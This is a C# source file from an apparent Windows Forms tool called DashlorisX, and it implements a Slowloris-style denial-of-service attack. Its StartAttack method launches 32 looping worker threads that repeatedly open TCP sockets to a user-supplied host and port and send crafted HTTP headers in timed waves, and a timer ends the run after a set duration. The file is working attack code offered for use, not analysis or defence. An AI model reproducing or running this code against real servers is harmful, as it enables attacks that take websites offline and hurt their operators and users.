// Author: Dashie
// Version: 1.0
//
// <description>
//

using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

using DashlorisX.Properties;

namespace DashlorisX
{ 
    public class PowerPoint
    {
	readonly AttackLog LogLog = new AttackLog();
	readonly DashNet DashNet = new DashNet();

	private string GetHeader()
	{
	    try
	    {
		var version = Settings.HTTPvBox.Text;
		var method = Settings.MethodBox.Text;

		var host = DashlorisX.HostTextBox.Text;

		if (host.Contains("http://") || host.Contains("https://"))
		{
		    host = host.ToLower().Replace("http://", "").Replace("https://", "");
		}

		var useragent = Settings.UserAgentBox.Text;
		var cookie = Settings.CookieBox.Text;

		var bytes = DashlorisX.BytesTextBox.Text;

		string Optionals()
		{
		    if (method == "POST")
		    {
			return string.Format
			(
			    "Accept-Encoding: gzip, deflate\r\n" +
			    "Upgrade-Insecure-Requests: 1\r\n"
			);
		    }

		    return string.Empty;
		}

		return string.Format(
		    $"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
		    $"Host: @\r\n".Replace("@", host) +
		    $"Content-Length: @\r\n".Replace("@", bytes) +
		    $"User-Agent: @\r\n".Replace("@", useragent) +
		    $"{Optionals()}\r\n" +
		    $"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
		);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	readonly List<Socket> Stockings = new List<Socket>();
	readonly List<Thread> DashBots = new List<Thread>();

	string host = string.Empty;
	string port = string.Empty;

	private void SendHeader(Socket stocking)
	{   
	    try
	    {
		stocking.Ttl = 255;
		
		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
		var success = result.AsyncWaitHandle.WaitOne(500, true);

		if (stocking.Connected)
		{
		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());

		    stocking.Send(header);
		}
		
		Stockings.Add(stocking);
	    }

	    catch
	    {
		return;
	    }
	}

	System.Timers.Timer DashTimer = null;

	private void StartTimer()
	{
	    try
	    {
		var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;

		DashTimer = new System.Timers.Timer(duration);

		DashTimer.Elapsed += (s, e) =>
		{
		    StopAttack();
		};

		DashTimer.AutoReset = false;
		DashTimer.Start();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}
	
	void LogSend(string text) =>
	    LogLog.TextLog.AppendText($"{text}\r\n");

	private void StartLatestDashBot()
	{
	    if (DashBots.Count > 0)
	    {
		DashBots[DashBots.Count - 1].IsBackground = true;
		DashBots[DashBots.Count - 1].Start();

		DashBots.Clear();
	    }
	}

	private void StartDashBots()
	{
	    foreach (Thread DashBot in DashBots)
	    {
		if (DashBots.IndexOf(DashBot) != 0)
		{
		    DashBot.Start();
		}
	    }
	}

	private Socket GetSocket() =>
	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	public void StartAttack()
	{
	    try
	    {
		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
		port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();

		LogSend("Starting workers ....");

		DashBots.Add(new Thread(() =>
		{
		    for (int k = 0; k < 32; k += 1)//worker integration
		    {
			DashBots.Add(new Thread(() =>
			{
			    while (true)
			    {
				for (int request = 0; request < 64; request += 1)
				{
				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
				    {
					SendHeader(GetSocket());
				    }

				    Thread.Sleep(2000);//inner interval integration
				}

				Thread.Sleep(8000);//interval integration
			    }
			}));

			Thread.Sleep(250);//worker portion startup delay
		    }

		    StartDashBots();
		}));

		StartLatestDashBot();
		StartTimer();

		LogSend("Sending waves and waves of requests ....");

		LogLog.ShowDialog();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	public void StopAttack()
	{//Asynchronously?
	    DashlorisX.Launch.Text = "Stopping ....";

	    LogSend($"Stop signal received, stopping {DashBots.Count} bots and disconnecting {Stockings.Count} connections ....");

	    try
	    {
		for (int k = 0; k < Stockings.Count; k += 1)
		{
		    Socket Stocking = Stockings[k];
		    
		    if (Stocking != null)
		    {
			if (Stocking.Connected)
			{
			    Stocking.Disconnect(false);
			    Stocking.Close();
			}
		    }

		    Stockings.RemoveAt(k);
		}

		for (int k = 0; k < DashBots.Count; k += 1)
		{
		    DashBots[k].Abort();
		    DashBots.RemoveAt(k);
		}

		if (DashTimer.Enabled)
		{
		    DashTimer.Stop();
		    DashTimer = null;
		}
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }

	    DashlorisX.Launch.Text = "Launch";
	}
    }
}
